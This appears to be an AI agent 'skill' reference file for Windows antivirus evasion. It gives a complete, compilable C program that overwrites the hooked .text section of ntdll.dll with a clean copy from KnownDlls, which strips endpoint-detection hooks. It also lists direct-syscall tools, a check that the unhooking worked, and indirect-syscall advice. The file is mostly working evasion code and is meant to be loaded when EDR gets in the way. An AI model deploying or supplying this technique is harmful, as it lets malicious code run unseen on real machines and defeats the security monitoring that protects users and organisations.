# NTDLL Unhooking — Complete Reference

> **Belongs to**: `windows-av-evasion` skill
> **Load when**: EDR is hooking ntdll.dll functions, preventing syscall-level evasion

## Background

EDR hooks `ntdll.dll` functions (e.g., NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) by patching the in-memory `.text` section. This intercepts ALL user-mode syscall invocations.

```
Normal: User code → ntdll.dll (HOOKED by EDR) → kernel
Direct: User code → syscall instruction → kernel (bypasses hook)
```

## Tool Comparison

| Tool | Method | Notes |
|---|---|---|
| **SysWhispers2/3** | Compile-time syscall stubs | Static syscall numbers |
| **HellsGate** | Runtime syscall number resolution | Dynamic, harder to detect |
| **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
| **TartarusGate** | Extended HalosGate | More robust resolution |

## Fresh ntdll Copy (Complete C Implementation)

```c
/**
 * Read clean ntdll.dll from disk KnownDlls and overwrite the hooked .text section in memory
 * Compile: x86_64-w64-mingw32-gcc -O2 unhook_ntdll.c -o unhook_ntdll.exe
 *
 * Principle: EDR hooks syscalls by modifying ntdll.dll's .text section in memory.
 *            Read clean ntdll.dll from disk, overwrite its .text section back into memory,
 *            completely removing all user-mode hooks.
 *
 * Critical: Must read from \\KnownDlls\\ (not System32),
 *           KnownDlls is a kernel-maintained memory mapping that EDR cannot modify.
 */

#include <windows.h>
#include <stdio.h>

/**
 * Get current process's ntdll.dll module info
 * Traverse PEB LDR list — no dependency on hook-sensitive APIs
 */
HMODULE GetNtdllBase() {
    // x64: Get PEB via GS segment register offset 0x60
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    PPEB_LDR_DATA pLdr = pPeb->Ldr;

    // Traverse InMemoryOrderModuleList
    PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;

    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY pEntry =
            CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY,
                              InMemoryOrderLinks);

        // Check if module name is ntdll.dll
        if (pEntry->BaseDllName.Length > 0) {
            WCHAR *name = pEntry->BaseDllName.Buffer;
            if (_wcsicmp(name, L"ntdll.dll") == 0) {
                return (HMODULE)pEntry->DllBase;
            }
        }
        entry = entry->Flink;
    }
    return NULL;
}

BOOL UnhookNtdll() {
    // 1. Get ntdll base address in current process
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) {
        printf("[-] GetNtdllBase() failed\n");
        return FALSE;
    }
    printf("[+] ntdll.dll base @ 0x%p\n", hNtdll);

    // 2. Read clean copy from \KnownDlls\ntdll.dll
    //    KnownDlls is a kernel-maintained Section object, EDR cannot modify
    HANDLE hFile = CreateFileA(
        "\\\\.\\GLOBALROOT\\KnownDlls\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        // Fallback to System32 (if KnownDlls unavailable)
        hFile = CreateFileA(
            "C:\\Windows\\System32\\ntdll.dll",
            GENERIC_READ, FILE_SHARE_READ, NULL,
            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
        );
    }

    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open ntdll.dll: %lu\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE *cleanNtdll = (BYTE *)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize
    );

    DWORD bytesRead;
    ReadFile(hFile, cleanNtdll, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);
    printf("[+] Loaded clean ntdll.dll: %lu bytes\n", fileSize);

    // 3. Manual PE header parse → locate .text section
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)cleanNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(cleanNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);

    LPVOID textAddr = NULL;
    DWORD textSize = 0;
    LPVOID textRawData = NULL;
    DWORD textRawSize = 0;

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
            textAddr = (LPVOID)((UINT_PTR)hNtdll + pSec[i].VirtualAddress);
            textSize = pSec[i].Misc.VirtualSize;
            textRawData = cleanNtdll + pSec[i].PointerToRawData;
            textRawSize = pSec[i].SizeOfRawData;
            break;
        }
    }

    if (!textAddr || !textRawData) {
        printf("[-] .text section not found\n");
        HeapFree(GetProcessHeap(), 0, cleanNtdll);
        return FALSE;
    }

    printf("[+] .text section: VA=0x%p, Size=0x%lx\n",
           textAddr, textSize);

    // 4. Overwrite in-memory .text with clean version
    DWORD oldProtect;
    if (!VirtualProtect(textAddr, textSize,
                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, cleanNtdll);
        return FALSE;
    }

    memcpy(textAddr, textRawData, textRawSize);

    DWORD dummy;
    VirtualProtect(textAddr, textSize, oldProtect, &dummy);

    printf("[+] ntdll.dll .text section restored — all EDR hooks removed\n");

    HeapFree(GetProcessHeap(), 0, cleanNtdll);
    return TRUE;
}
```

## Verification

```c
// After unhooking, check NtAllocateVirtualMemory's first 4 bytes
// Original: 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
// Hooked:   usually contains E9 (JMP) or FF 25 (JMP [mem])
BYTE *pNtAlloc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                "NtAllocateVirtualMemory");
printf("NtAllocateVirtualMemory entry: %02X %02X %02X %02X\n",
       pNtAlloc[0], pNtAlloc[1], pNtAlloc[2], pNtAlloc[3]);
// If output is 4C 8B D1 B8 → Unhooking successful
```

## Indirect Syscalls

```
// Instead of: syscall (in your code — suspicious location)
// Do: jump to syscall instruction inside ntdll.dll (legitimate location)
// The return address on stack points to ntdll.dll, not your code
```
